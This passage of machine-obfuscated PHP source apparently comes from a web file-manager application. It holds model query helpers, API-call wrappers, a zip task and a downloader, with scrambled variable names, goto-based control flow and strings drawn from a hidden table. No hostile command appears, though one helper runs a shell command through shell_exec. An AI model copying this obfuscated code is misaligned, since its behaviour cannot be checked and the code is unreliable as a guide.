$AÓóÃÔ§¦ø[$aá÷î‚Ü¹]; } } else { $d‘ÊËÀèÆ¯[$f®éò¼¡Å[0]] = $AÓóÃÔ§¦ø[$f®éò¼¡Å[0]]; } if (!empty($AÓóÃÔ§¦ø[$this->getPk()])) { $d‘ÊËÀèÆ¯[$this->getPk()] = array($C°¯“À”³[316], $AÓóÃÔ§¦ø[$this->getPk()]); } if ($this->where($d‘ÊËÀèÆ¯)->find()) { return !1; } return !0; default: return $this->check($AÓóÃÔ§¦ø[$f®éò¼¡Å[0]], $f®éò¼¡Å[1], $f®éò¼¡Å[4]); } } public function check($A¨ã·¦Ñƒ, $EâÖÑ‡È‡Ÿ, $CİãÉßñ¸ƒ = "\x72\145\x67\x65\x78") { $aŒÇáìñ¤‹ =& $_SERVER[¿õñ]; $CİãÉßñ¸ƒ = strtolower(trim($CİãÉßñ¸ƒ)); switch ($CİãÉßñ¸ƒ) { case $aŒÇáìñ¤‹[7]: case $aŒÇáìñ¤‹[317]: $BæïÃ†íé = is_array($EâÖÑ‡È‡Ÿ) ? $EâÖÑ‡È‡Ÿ : explode($aŒÇáìñ¤‹[47], $EâÖÑ‡È‡Ÿ); return $CİãÉßñ¸ƒ == $aŒÇáìñ¤‹[7] ? in_array($A¨ã·¦Ñƒ, $BæïÃ†íé) : !in_array($A¨ã·¦Ñƒ, $BæïÃ†íé); case $aŒÇáìñ¤‹[318]: case $aŒÇáìñ¤‹[319]: if (is_array($EâÖÑ‡È‡Ÿ)) { $d¥¾ŒÇ¸ğ® = $EâÖÑ‡È‡Ÿ[0]; $AÅÇ†µÉÒÀ = $EâÖÑ‡È‡Ÿ[1]; } else { list($d¥¾ŒÇ¸ğ®, $AÅÇ†µÉÒÀ) = explode($aŒÇáìñ¤‹[47], $EâÖÑ‡È‡Ÿ); } return $CİãÉßñ¸ƒ == $aŒÇáìñ¤‹[318] ? $A¨ã·¦Ñƒ >= $d¥¾ŒÇ¸ğ® && $A¨ã·¦Ñƒ <= $AÅÇ†µÉÒÀ : $A¨ã·¦Ñƒ < $d¥¾ŒÇ¸ğ® || $A¨ã·¦Ñƒ > $AÅÇ†µÉÒÀ; case $aŒÇáìñ¤‹[320]: case $aŒÇáìñ¤‹[321]: return $CİãÉßñ¸ƒ == $aŒÇáìñ¤‹[320] ? $A¨ã·¦Ñƒ == $EâÖÑ‡È‡Ÿ : $A¨ã·¦Ñƒ != $EâÖÑ‡È‡Ÿ; case $aŒÇáìñ¤‹[322]: $E¢‚«Õö¥ = mb_strlen($A¨ã·¦Ñƒ, $aŒÇáìñ¤‹[323]); if (strpos($EâÖÑ‡È‡Ÿ, $aŒÇáìñ¤‹[47])) { list($d¥¾ŒÇ¸ğ®, $AÅÇ†µÉÒÀ) = explode($aŒÇáìñ¤‹[47], $EâÖÑ‡È‡Ÿ); return $E¢‚«Õö¥ >= $d¥¾ŒÇ¸ğ® && $E¢‚«Õö¥ <= $AÅÇ†µÉÒÀ; } else { return $E¢‚«Õö¥ == $EâÖÑ‡È‡Ÿ; } case $aŒÇáìñ¤‹[324]: list($d‹ªØàğ¼ö, $dó¦¼¿­Î) = explode($aŒÇáìñ¤‹[47], $EâÖÑ‡È‡Ÿ); if (!is_numeric($d‹ªØàğ¼ö)) { $d‹ªØàğ¼ö = strtotime($d‹ªØàğ¼ö); } if (!is_numeric($dó¦¼¿­Î)) { $dó¦¼¿­Î = strtotime($dó¦¼¿­Î); } return NOW_TIME >= $d‹ªØàğ¼ö && NOW_TIME <= $dó¦¼¿­Î; case $aŒÇáìñ¤‹[325]: return in_array(get_client_ip(), explode($aŒÇáìñ¤‹[47], $EâÖÑ‡È‡Ÿ)); case $aŒÇáìñ¤‹[326]: return !in_array(get_client_ip(), explode($aŒÇáìñ¤‹[47], $EâÖÑ‡È‡Ÿ)); case $aŒÇáìñ¤‹[313]: default: return $this->regex($A¨ã·¦Ñƒ, $EâÖÑ‡È‡Ÿ); } } public function query($fŞ£°¥¡, $EÜ„¨öóÌÓ = false) { $d‘†ƒ“†æÑ =& $_SERVER[¿õñ]; if (!is_bool($EÜ„¨öóÌÓ) && !is_array($EÜ„¨öóÌÓ)) { $EÜ„¨öóÌÓ = func_get_args(); array_shift($EÜ„¨öóÌÓ); } $fŞ£°¥¡ = str_replace(array($d‘†ƒ“†æÑ[214], $d‘†ƒ“†æÑ[327]), $d‘†ƒ“†æÑ[50], $fŞ£°¥¡); $fŞ£°¥¡ = $this->parseSql($fŞ£°¥¡, $EÜ„¨öóÌÓ); return $this->db->query($fŞ£°¥¡); } public function execute($AŒøÊÛ÷ùĞ, $Bä¨«İÉ¯ = false) { if (!is_bool($Bä¨«İÉ¯) && !is_array($Bä¨«İÉ¯)) { $Bä¨«İÉ¯ = func_get_args(); array_shift($Bä¨«İÉ¯); } $AŒøÊÛ÷ùĞ = $this->parseSql($AŒøÊÛ÷ùĞ, $Bä¨«İÉ¯); return $this->db->execute($AŒøÊÛ÷ùĞ); } protected function parseSql($FÕèÂŸ„, $CĞÅ¤ÛÂ¡‘) { $f™ªßÙáÕ× =& $_SERVER[¿õñ]; if (!0 === $CĞÅ¤ÛÂ¡‘) { $eÁ•¦Ä¶¦ = $this->_parseOptions(); $FÕèÂŸ„ = $this->db->parseSql($FÕèÂŸ„, $eÁ•¦Ä¶¦); } elseif (is_array($CĞÅ¤ÛÂ¡‘)) { $CĞÅ¤ÛÂ¡‘ = array_map(array($this->db, $f™ªßÙáÕ×[328]), $CĞÅ¤ÛÂ¡‘); $FÕèÂŸ„ = vsprintf($FÕèÂŸ„, $CĞÅ¤ÛÂ¡‘); } else { $FÕèÂŸ„ = strtr($FÕèÂŸ„, array($f™ªßÙáÕ×[329] => $this->getTableName(), $f™ªßÙáÕ×[330] => think_config($f™ªßÙáÕ×[229]))); } $this->db->setModel($this->name); return $FÕèÂŸ„; } public function db($f±†¯Åêµ = '', $FİÏÛ¾†š = '', $E‚“ƒŠëß = array()) { goto CÕ÷º„…öğ; BÖø¥îÆÔ†: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto bÁ½ÄŠ´®Ç; Fà¶¬ÔòÂÉ: static $c†ÅÍèÎŠ› = array(); if (!isset($c†ÅÍèÎŠ›[$f±†¯Åêµ]) || isset($c†ÅÍèÎŠ›[$f±†¯Åêµ]) && $FİÏÛ¾†š && $EˆŞóïé÷[$f±†¯Åêµ] != $FİÏÛ¾†š) { if (!empty($FİÏÛ¾†š) && is_string($FİÏÛ¾†š) && !1 === strpos($FİÏÛ¾†š, $AŠŸóÌİÆŠ[8])) { $FİÏÛ¾†š = think_config($FİÏÛ¾†š); } $c†ÅÍèÎŠ›[$f±†¯Åêµ] = Db::getInstance($FİÏÛ¾†š); } elseif (NULL === $FİÏÛ¾†š) { $c†ÅÍèÎŠ›[$f±†¯Åêµ]->close(); unset($c†ÅÍèÎŠ›[$f±†¯Åêµ]); return; } if (!empty($E‚“ƒŠëß)) { if (is_string($E‚“ƒŠëß)) { parse_str($E‚“ƒŠëß, $E‚“ƒŠëß); } foreach ($E‚“ƒŠëß as $bÈ¡¸Ç×İ => $FÜ©„Å‹„) { $this->setProperty($bÈ¡¸Ç×İ, $FÜ©„Å‹„); } } goto A×¹æ´óùà; A×¹æ´óùà: $EˆŞóïé÷[$f±†¯Åêµ] = $FİÏÛ¾†š; $this->db = $c†ÅÍèÎŠ›[$f±†¯Åêµ]; $this->_after_db(); goto BÖø¥îÆÔ†; CÕ÷º„…öğ: $AŠŸóÌİÆŠ =& $_SERVER[¿õñ]; if ($AŠŸóÌİÆŠ[33] === $f±†¯Åêµ && $this->db) { return $this->db; } static $EˆŞóïé÷ = array(); goto Fà¶¬ÔòÂÉ; bÁ½ÄŠ´®Ç: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $E¶öåó© = get_class($this); if ($E¶öåó© == $_SERVER[¿õñ][331]) { return $this->name; } $this->name = substr($E¶öåó©, 0, -5); } return $this->name; } public function getTableName() { $b…šùÂæà¼ =& $_SERVER[¿õñ]; if (empty($this->trueTableName)) { $D‡ÎªÄëÙø = !empty($this->tablePrefix) ? $this->tablePrefix : $b…šùÂæà¼[33]; if (!empty($this->tableName)) { $D‡ÎªÄëÙø .= $this->tableName; } else { $D‡ÎªÄëÙø .= think_parse_name($this->name); } $this->trueTableName = strtolower($D‡ÎªÄëÙø); } return (!empty($this->dbName) ? $this->dbName . $b…šùÂæà¼[92] : $b…šùÂæà¼[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $eêŒæäõ§˜ =& $_SERVER[¿õñ]; return isset($this->fields[$eêŒæäõ§˜[236]]) ? $this->fields[$eêŒæäõ§˜[236]] : $this->pk; } public function getDbFields() { $DãÍ“Ÿ…í© =& $_SERVER[¿õñ]; if (isset($this->options[$DãÍ“Ÿ…í©[264]])) { $B‘ ÂÄÏ = $this->db->getFields($this->options[$DãÍ“Ÿ…í©[264]]); return $B‘ ÂÄÏ ? array_keys($B‘ ÂÄÏ) : !1; } if ($this->fields) { $B‘ ÂÄÏ = $this->fields; unset($B‘ ÂÄÏ[$DãÍ“Ÿ…í©[235]], $B‘ ÂÄÏ[$DãÍ“Ÿ…í©[236]], $B‘ ÂÄÏ[$DãÍ“Ÿ…í©[237]], $B‘ ÂÄÏ[$DãÍ“Ÿ…í©[234]]); return $B‘ ÂÄÏ; } return !1; } public function data($AÓæíµ¿Ô£ = '') { $e¼‘ˆÌ¢á =& $_SERVER[¿õñ]; if ($e¼‘ˆÌ¢á[33] === $AÓæíµ¿Ô£ && !empty($this->data)) { return $this->data; } if (is_object($AÓæíµ¿Ô£)) { $AÓæíµ¿Ô£ = get_object_vars($AÓæíµ¿Ô£); } elseif (is_string($AÓæíµ¿Ô£)) { parse_str($AÓæíµ¿Ô£, $AÓæíµ¿Ô£); } elseif (!is_array($AÓæíµ¿Ô£)) { think_exception(think_lang($e¼‘ˆÌ¢á[256])); } $this->data = $AÓæíµ¿Ô£; return $this; } public function join($FŸ”ª¸è¤«) { $cö–œª«Ô =& $_SERVER[¿õñ]; if (is_array($FŸ”ª¸è¤«)) { $this->options[$cö–œª«Ô[267]] = $FŸ”ª¸è¤«; } elseif (!empty($FŸ”ª¸è¤«)) { $this->options[$cö–œª«Ô[267]][] = $FŸ”ª¸è¤«; } return $this; } public function union($CŠ„‡“¹ÒÍ, $AŞÔ÷ù¶·Š = false) { goto dÓ¥¦ììáË; dÓ¥¦ììáË: $D”šöŠ¹à‹ =& $_SERVER[¿õñ]; if (empty($CŠ„‡“¹ÒÍ)) { return $this; } if ($AŞÔ÷ù¶·Š) { $this->options[$D”šöŠ¹à‹[332]][$D”šöŠ¹à‹[333]] = !0; } goto D™ÛÊĞ½Æ–; f„‰”ò¢‰£: return $this; goto A™¾”–Ã²â; D™ÛÊĞ½Æ–: if (is_object($CŠ„‡“¹ÒÍ)) { $CŠ„‡“¹ÒÍ = get_object_vars($CŠ„‡“¹ÒÍ); } if (is_string($CŠ„‡“¹ÒÍ)) { $aæŠĞ·¨Øé = $CŠ„‡“¹ÒÍ; } elseif (is_array($CŠ„‡“¹ÒÍ)) { if (isset($CŠ„‡“¹ÒÍ[0])) { $this->options[$D”šöŠ¹à‹[332]] = array_merge($this->options[$D”šöŠ¹à‹[332]], $CŠ„‡“¹ÒÍ); return $this; } else { $aæŠĞ·¨Øé = $CŠ„‡“¹ÒÍ; } } else { think_exception(think_lang($D”šöŠ¹à‹[256])); } $this->options[$D”šöŠ¹à‹[332]][] = $aæŠĞ·¨Øé; goto f„‰”ò¢‰£; A™¾”–Ã²â: } public function cache($e¨Êš–ŠËß = true, $A­ÜÏÆ® = null, $c«ïåØÏ˜• = '') { $DÓ†®•¢… =& $_SERVER[¿õñ]; if (!1 !== $e¨Êš–ŠËß) { $this->options[$DÓ†®•¢…[334]] = array($DÓ†®•¢…[88] => $e¨Êš–ŠËß, $DÓ†®•¢…[324] => $A­ÜÏÆ®, $DÓ†®•¢…[29] => $c«ïåØÏ˜•); } return $this; } public function field($f˜Å×¦ÂÙç, $F²ÈğÜ»ÌÄ = false) { $CŠ°ÊÁÆé¦ =& $_SERVER[¿õñ]; if (!0 === $f˜Å×¦ÂÙç) { $F£¥ä×øÜ” = $this->getDbFields(); $f˜Å×¦ÂÙç = $F£¥ä×øÜ” ? $F£¥ä×øÜ” : $CŠ°ÊÁÆé¦[173]; } elseif ($F²ÈğÜ»ÌÄ) { if (is_string($f˜Å×¦ÂÙç)) { $f˜Å×¦ÂÙç = explode($CŠ°ÊÁÆé¦[47], $f˜Å×¦ÂÙç); } $F£¥ä×øÜ” = $this->getDbFields(); $f˜Å×¦ÂÙç = $F£¥ä×øÜ” ? array_diff($F£¥ä×øÜ”, $f˜Å×¦ÂÙç) : $f˜Å×¦ÂÙç; } $this->options[$CŠ°ÊÁÆé¦[258]] = $f˜Å×¦ÂÙç; return $this; } public function scope($DóÛ­Ù¡äÇ = '', $aÛ„Á…£‡ = NULL) { $D°†İŸ®ÎÜ =& $_SERVER[¿õñ]; if ($D°†İŸ®ÎÜ[33] === $DóÛ­Ù¡äÇ) { if (isset($this->_scope[$D°†İŸ®ÎÜ[34]])) { $B‡’ÚÚà…¶ = $this->_scope[$D°†İŸ®ÎÜ[34]]; } else { return $this; } } elseif (is_string($DóÛ­Ù¡äÇ)) { $E‰µùô³¯§ = explode($D°†İŸ®ÎÜ[47], $DóÛ­Ù¡äÇ); $B‡’ÚÚà…¶ = array(); foreach ($E‰µùô³¯§ as $DØ—»‘Œ í) { if (!isset($this->_scope[$DØ—»‘Œ í])) { continue; } $B‡’ÚÚà…¶ = array_merge($B‡’ÚÚà…¶, $this->_scope[$DØ—»‘Œ í]); } if (!empty($aÛ„Á…£‡) && is_array($aÛ„Á…£‡)) { $B‡’ÚÚà…¶ = array_merge($B‡’ÚÚà…¶, $aÛ„Á…£‡); } } elseif (is_array($DóÛ­Ù¡äÇ)) { $B‡’ÚÚà…¶ = $DóÛ­Ù¡äÇ; } if (is_array($B‡’ÚÚà…¶) && !empty($B‡’ÚÚà…¶)) { $this->options = array_merge($this->options, array_change_key_case($B‡’ÚÚà…¶)); } return $this; } public function where($a»À»„‘ˆÜ, $cŒ™˜ã¦õÇ = null) { $d¼¾¶ÛâéÈ =& $_SERVER[¿õñ]; if (!is_null($cŒ™˜ã¦õÇ) && is_string($a»À»„‘ˆÜ)) { if (!is_array($cŒ™˜ã¦õÇ)) { $cŒ™˜ã¦õÇ = func_get_args(); array_shift($cŒ™˜ã¦õÇ); } $cŒ™˜ã¦õÇ = array_map(array($this->db, $d¼¾¶ÛâéÈ[328]), $cŒ™˜ã¦õÇ); $a»À»„‘ˆÜ = vsprintf($a»À»„‘ˆÜ, $cŒ™˜ã¦õÇ); } elseif (is_object($a»À»„‘ˆÜ)) { $a»À»„‘ˆÜ = get_object_vars($a»À»„‘ˆÜ); } if (is_string($a»À»„‘ˆÜ) && $d¼¾¶ÛâéÈ[33] != $a»À»„‘ˆÜ) { $B“‡õÜğƒö = array(); $B“‡õÜğƒö[$d¼¾¶ÛâéÈ[335]] = $a»À»„‘ˆÜ; $a»À»„‘ˆÜ = $B“‡õÜğƒö; } if (isset($this->options[$d¼¾¶ÛâéÈ[260]])) { $this->options[$d¼¾¶ÛâéÈ[260]] = array_merge($this->options[$d¼¾¶ÛâéÈ[260]], $a»À»„‘ˆÜ); } else { $this->options[$d¼¾¶ÛâéÈ[260]] = $a»À»„‘ˆÜ; } return $this; } public function limit($cË©èÓ™øÖ, $B¹¦´µ÷Ü = null) { $cºª³š¨…» =& $_SERVER[¿õñ]; $this->options[$cºª³š¨…»[277]] = is_null($B¹¦´µ÷Ü) ? $cË©èÓ™øÖ : $cË©èÓ™øÖ . $cºª³š¨…»[47] . $B¹¦´µ÷Ü; return $this; } public function page($eĞ‘”¾Øó¨, $B‘×É‚îçÁ = null) { $fĞ±í†äŸ— =& $_SERVER[¿õñ]; $this->options[$fĞ±í†äŸ—[336]] = is_null($B‘×É‚îçÁ) ? $eĞ‘”¾Øó¨ : $eĞ‘”¾Øó¨ . $fĞ±í†äŸ—[47] . $B‘×É‚îçÁ; return $this; } public function comment($EÃÉÏÔîù†) { $this->options[$_SERVER[¿õñ][337]] = $EÃÉÏÔîù†; return $this; } public function setProperty($Cù¤½ØÅ¤, $fİâ…›¦Ç) { if (property_exists($this, $Cù¤½ØÅ¤)) { $this->{$Cù¤½ØÅ¤} = $fİâ…›¦Ç; } return $this; } } goto C«öôš´É‚; F™Ï¯¼—ä: function beforeShutdown() { Hook::trigger($_SERVER[ĞÌÅˆ•ÉíŒÆÆ][35]); } $_SERVER[$_SERVER[ĞÌÅˆ•ÉíŒÆÆ][36]] = BASIC_PATH; $_SERVER[$_SERVER[ĞÌÅˆ•ÉíŒÆÆ][37]] = LIB_DIR; goto aæ©‘‡¥Š…; D‚£ù‘½™: function ActionCall($B¥°ÃÚÍ ) { $cöÀ¯Ø±Î£ = array_slice(func_get_args(), 1); return ActionApply($B¥°ÃÚÍ , $cöÀ¯Ø±Î£); } function ActionCallApi($CËºê‹—¨§, $dÚéÊ¥¥‘ = '') { goto Eƒ£°•×–ö; BàÄ©éºøÁ: return $F‚âë›¡»Ø; goto e°§Êç¡¡¾; c…ªÇ³Ş„ø: $b¬ğø¨×Ü = phpBinCommand(); if ($b¬ğø¨×Ü && function_exists($cå˜¦äî‹[25])) { $b§½Ä²ï = $b¬ğø¨×Ü . $cå˜¦äî‹[26] . BASIC_PATH . $cå˜¦äî‹[27] . escapeshellarg($CËºê‹—¨§); $FÙ‚·ÌÔÂ = shell_exec($b§½Ä²ï); } if (!$FÙ‚·ÌÔÂ) { $Aæ‰­¦İã“ = stream_context_create(array($cå˜¦äî‹[28] => array($cå˜¦äî‹[29] => 20, $cå˜¦äî‹[30] => $cå˜¦äî‹[31]))); $FÙ‚·ÌÔÂ = file_get_contents(app_host_get() . $CËºê‹—¨§, !1, $Aæ‰­¦İã“); } goto d¸Çïöë’; CØ¸«‡²éÉ: $AÀØšï§³ª = Action($cå˜¦äî‹[23])->accessToken(); $CËºê‹—¨§ = str_replace($cå˜¦äî‹[5], $cå˜¦äî‹[4], $CËºê‹—¨§) . $cå˜¦äî‹[24] . $AÀØšï§³ª . $fÒØ¨ÀìÃœ; $FÙ‚·ÌÔÂ = $cå˜¦äî‹[20]; goto c…ªÇ³Ş„ø; d¸Çïöë’: $eƒäÍêíŞÃ = json_decode($FÙ‚·ÌÔÂ, !0); $F‚âë›¡»Ø = is_array($eƒäÍêíŞÃ) ? $eƒäÍêíŞÃ : array($cå˜¦äî‹[32] => null, $cå˜¦äî‹[33] => $FÙ‚·ÌÔÂ); if (!$eƒäÍêíŞÃ) { echo $FÙ‚·ÌÔÂ; } goto BàÄ©éºøÁ; Eƒ£°•×–ö: $cå˜¦äî‹ =& $_SERVER[ĞÌÅˆ•ÉíŒÆÆ]; $fÒØ¨ÀìÃœ = $dÚéÊ¥¥‘; if (is_array($dÚéÊ¥¥‘)) { $fÒØ¨ÀìÃœ = $cå˜¦äî‹[20]; foreach ($dÚéÊ¥¥‘ as $cƒÓİó => $CĞËÎŒ²¿) { $CĞËÎŒ²¿ = is_array($CĞËÎŒ²¿) ? json_encode($CĞËÎŒ²¿) : $CĞËÎŒ²¿; $CĞËÎŒ²¿ = is_bool($CĞËÎŒ²¿) ? intval($CĞËÎŒ²¿) : $CĞËÎŒ²¿; $fÒØ¨ÀìÃœ .= $cå˜¦äî‹[21] . $cƒÓİó . $cå˜¦äî‹[22] . rawurlencode($CĞËÎŒ²¿); } } goto CØ¸«‡²éÉ; e°§Êç¡¡¾: } function ActionCallHook($F£šƒ£¼Î¦) { goto A„æ¥œ‡–ê; A„æ¥œ‡–ê: $AœÚË‰¯§Ë =& $_SERVER[ĞÌÅˆ•ÉíŒÆÆ]; ob_start(); $BÍ§Ìàöºî = array_slice(func_get_args(), 1); goto càªÃÆ½Ÿé; càªÃÆ½Ÿé: $GLOBALS[$AœÚË‰¯§Ë[34]] = 1; $c§ØëÜÜß = ActionApply($F£šƒ£¼Î¦, $BÍ§Ìàöºî); $CÛ§¼èŠ» = ob_get_clean(); goto bÜ“ÀœÊ¿»; bÜ“ÀœÊ¿»: $c§ØëÜÜß = $CÛ§¼èŠ» ? json_decode($CÛ§¼èŠ», !0) : $c§ØëÜÜß; $GLOBALS[$AœÚË‰¯§Ë[34]] = 0; return $c§ØëÜÜß; goto dôÍ‰éŸŒ; dôÍ‰éŸŒ: } goto F™Ï¯¼—ä; b÷™—é‡Í: class TaskZip extends TaskFileTransfer { protected function startAfter() { $D¿®«¾âÓö =& $_SERVER[¿õñ]; parent::startAfter(); Hook::bind($D¿®«¾âÓö[1421], array($this, $D¿®«¾âÓö[1416])); $fÓ½Üì¬Ã =& $this->task; $fÓ½Üì¬Ã[$D¿®«¾âÓö[1418]] = $D¿®«¾âÓö[1025]; if (!$fÓ½Üì¬Ã[$D¿®«¾âÓö[1247]]) { $fÓ½Üì¬Ã[$D¿®«¾âÓö[1247]] = LNG($D¿®«¾âÓö[1422]); } } protected function endAfter() { $a—±Ô¢ŠÉ =& $_SERVER[¿õñ]; parent::endAfter(); Hook::unbind($a—±Ô¢ŠÉ[1421], array($this, $a—±Ô¢ŠÉ[1416])); } public function updateAfter() { $eÊ¤ğ®ß” =& $_SERVER[¿õñ]; $f»æõ·Ú‘¨ =& $this->task; if (!$f»æõ·Ú‘¨[$eÊ¤ğ®ß”[1293]] || !$f»æõ·Ú‘¨[$eÊ¤ğ®ß”[695]]) { return; } if ($f»æõ·Ú‘¨[$eÊ¤ğ®ß”[1418]] == $eÊ¤ğ®ß”[1025]) { $A¼Ã’Èíì = $f»æõ·Ú‘¨[$eÊ¤ğ®ß”[1396]]; if ($f»æõ·Ú‘¨[$eÊ¤ğ®ß”[1397]] != $eÊ¤ğ®ß”[1025]) { $A¼Ã’Èíì = 0; } $bš”›àãÉÎ = ($f»æõ·Ú‘¨[$eÊ¤ğ®ß”[1400]] + $A¼Ã’Èíì) / $f»æõ·Ú‘¨[$eÊ¤ğ®ß”[695]]; $f»æõ·Ú‘¨[$eÊ¤ğ®ß”[1351]] = $bš”›àãÉÎ * 0.3; } else { if ($f»æõ·Ú‘¨[$eÊ¤ğ®ß”[1418]] == $eÊ¤ğ®ß”[298]) { $bš”›àãÉÎ = $f»æõ·Ú‘¨[$eÊ¤ğ®ß”[1298]] / $f»æõ·Ú‘¨[$eÊ¤ğ®ß”[1293]]; $f»æõ·Ú‘¨[$eÊ¤ğ®ß”[1351]] = 0.3 + $bš”›àãÉÎ * 0.5; } else { if ($f»æõ·Ú‘¨[$eÊ¤ğ®ß”[1418]] == $eÊ¤ğ®ß”[90]) { $bš”›àãÉÎ = 0; if ($f»æõ·Ú‘¨[$eÊ¤ğ®ß”[1395]]) { $bš”›àãÉÎ = $f»æõ·Ú‘¨[$eÊ¤ğ®ß”[1396]] / $f»æõ·Ú‘¨[$eÊ¤ğ®ß”[1395]]; } $f»æõ·Ú‘¨[$eÊ¤ğ®ß”[1351]] = 0.3 + 0.5 + $bš”›àãÉÎ * 0.2; } } } if ($f»æõ·Ú‘¨[$eÊ¤ğ®ß”[1351]] > 0) { $FèŸÕ®ÜÂ‚ = timeFloat() - $f»æõ·Ú‘¨[$eÊ¤ğ®ß”[1353]] - $f»æõ·Ú‘¨[$eÊ¤ğ®ß”[1356]]; $f»æõ·Ú‘¨[$eÊ¤ğ®ß”[1357]] = $FèŸÕ®ÜÂ‚ * (1 - $f»æõ·Ú‘¨[$eÊ¤ğ®ß”[1351]]) / $f»æõ·Ú‘¨[$eÊ¤ğ®ß”[1351]]; } } public function copyFileStart($cÄ¹ªÛÎ°, $A¾Œ¦­÷ÓÏ, $b…¦¿ÌØé, $D–½Œ©ŸˆÒ, $fÔ¦¤åÑ¬, $B¾Ø†ˆšÈĞ) { $D¾£ëø‡î =& $_SERVER[¿õñ]; parent::copyFileStart($cÄ¹ªÛÎ°, $A¾Œ¦­÷ÓÏ, $b…¦¿ÌØé, $D–½Œ©ŸˆÒ, $fÔ¦¤åÑ¬, $B¾Ø†ˆšÈĞ); $a«¬ØÄ¾Ô =& $this->task; if ($a«¬ØÄ¾Ô[$D¾£ëø‡î[1418]] == $D¾£ëø‡î[298]) { $a«¬ØÄ¾Ô[$D¾£ëø‡î[1418]] = $D¾£ëø‡î[90]; } $this->update(); } public function copyFileEnd($dÇÊ½°ç, $Dá»¥ïË‹à, $Fƒ·ãÉÚõà, $B·»­«´ß, $AÄµ»§ÍØÂ, $Dæ…Ÿå‚ƒ) { $aã¹Û÷¹‚ˆ =& $_SERVER[¿õñ]; $f•Û ‡ø»† =& $this->task; $f•Û ‡ø»†[$aã¹Û÷¹‚ˆ[1396]] = $f•Û ‡ø»†[$aã¹Û÷¹‚ˆ[1395]]; $f•Û ‡ø»†[$aã¹Û÷¹‚ˆ[1400]] += $f•Û ‡ø»†[$aã¹Û÷¹‚ˆ[1395]]; $f•Û ‡ø»†[$aã¹Û÷¹‚ˆ[1397]] = $aã¹Û÷¹‚ˆ[33]; $this->update(); } public function nameParse($Aö¢Îè†Ã¯) { $AÆØÄÙÂÆ =& $_SERVER[¿õñ]; $AÓĞ„ŒÌ‰ =& $this->task; if ($AÓĞ„ŒÌ‰[$AÆØÄÙÂÆ[1298]] < $AÓĞ„ŒÌ‰[$AÆØÄÙÂÆ[1293]]) { $e‹İÍ²ãë¦ = get_path_this($Aö¢Îè†Ã¯); if (strstr($e‹İÍ²ãë¦, $AÆØÄÙÂÆ[92])) { $AÓĞ„ŒÌ‰[$AÆØÄÙÂÆ[1298]] += 1; } } if ($AÓĞ„ŒÌ‰[$AÆØÄÙÂÆ[1418]] == $AÆØÄÙÂÆ[1025]) { $AÓĞ„ŒÌ‰[$AÆØÄÙÂÆ[1418]] = $AÆØÄÙÂÆ[298]; } $AÓĞ„ŒÌ‰[$AÆØÄÙÂÆ[1393]] = $Aö¢Îè†Ã¯; $this->update(); } } class Downloader { static function start($eŒ“È˜“ƒ¦, $F•¬ğ¢ŠÌÅ, $F“™ê»›•§ = 10) { goto Aê„»Ø‚ƒ§; Aê„»Ø‚ƒ§: $fëÌ™ÃÍ«… =& $_SERVER[¿õñ]; if (!request_url_safe($eŒ“È˜“ƒ¦)) { return array($fëÌ™ÃÍ«…[1017] => !1, $fëÌ™ÃÍ«…[1019] => $fëÌ™ÃÍ«…[1022]); } $fº‰¢»ÃÆ = $F•¬ğ¢ŠÌÅ . $fëÌ™ÃÍ«…[1423]; goto cÚ ÉÇ•Ã±; cÚ ÉÇ•Ã±: $AÖ¶æ¹ = $F•¬ğ¢ŠÌÅ . $fëÌ™ÃÍ«…[1424]; if (is_array($eŒ“È˜“ƒ¦)) { $dö„‚ÀÂ = $eŒ“È˜“ƒ¦; } else { $dö„‚ÀÂ = url_header($eŒ“È˜“ƒ¦); } $eŒ“È˜“ƒ¦ = $dö„‚ÀÂ[$fëÌ™ÃÍ«…[292]]; goto còĞ‘ùŸƒ®; FËÄáÆêÉË: $C•êÄÙÇ…Û = intval($dö„‚ÀÂ[$fëÌ™ÃÍ«…[322]]); if (file_exists($AÖ¶æ¹) && time() - filemtime($AÖ¶æ¹) < 3) { return array($fëÌ™ÃÍ«…[1017] => !1, $fëÌ™ÃÍ«…[1019] => $fëÌ™ÃÍ«…[1425]); } $c¢İ»­Ï… = array(); goto B£„¶¬‹‡Û; cÀ…éİá•ù: if ($D“µÔ‡»ó„[$fëÌ™ÃÍ«…[1017]]) { @unlink($fº‰¢»ÃÆ); } return $D“µÔ‡»ó„; goto d•¾‰ŸÂ·; B£„¶¬‹‡Û: if (is_file($fº‰¢»ÃÆ)) { $E¥¼¾ßÂß = file_get_contents($fº‰¢»ÃÆ); $c¢İ»­Ï… = json_decode($E¥¼¾ßÂß, 1); } if (file_exists($F•¬ğ¢ŠÌÅ) && $C•êÄÙÇ…Û == filesize($F•¬ğ¢ŠÌÅ)) { @unlink($AÖ¶æ¹); @unlink($fº‰¢»ÃÆ); return array($fëÌ™ÃÍ«…[1017] => !0, $fëÌ™ÃÍ«…[1019] => $fëÌ™ÃÍ«…[1426]); } if ($c¢İ»­Ï…[$fëÌ™ÃÍ«…[322]] != $C•êÄÙÇ…Û) { $c¢İ»­Ï… = array($fëÌ™ÃÍ«…[322] => $C•êÄÙÇ…Û); } goto cµÅÜÏô³; còĞ‘ùŸƒ®: if (!$eŒ“È˜“ƒ¦) { return array($fëÌ™ÃÍ«…[1017] => !1, $fëÌ™ÃÍ«…[1019] => $fëÌ™ÃÍ«…[1022]); } if (!$dö„‚ÀÂ[$fëÌ™ÃÍ«…[1210]] || $dö„‚ÀÂ[$fëÌ™ÃÍ«…[322]] == 0) { @unlink($AÖ¶æ¹); @unlink($F•¬ğ¢ŠÌÅ); $D“µÔ‡»ó„ = self::fileDownloadFopen($eŒ“È˜“ƒ¦, $F•¬ğ¢ŠÌÅ, $dö„‚ÀÂ[$fëÌ™ÃÍ«…[322]]); if ($D“µÔ‡»ó„[$fëÌ™ÃÍ«…[1017]]) { return $D“µÔ‡»ó„; } else { @unlink($AÖ¶æ¹); @unlink($F•¬ğ¢ŠÌÅ); $D“µÔ‡»ó„ = self::fileDownloadCurl($eŒ“È˜“ƒ¦, $F•¬ğ¢ŠÌÅ, !1, 0, $dö„‚ÀÂ[$fëÌ™ÃÍ«…[322]]); @unlink($AÖ¶æ¹); return 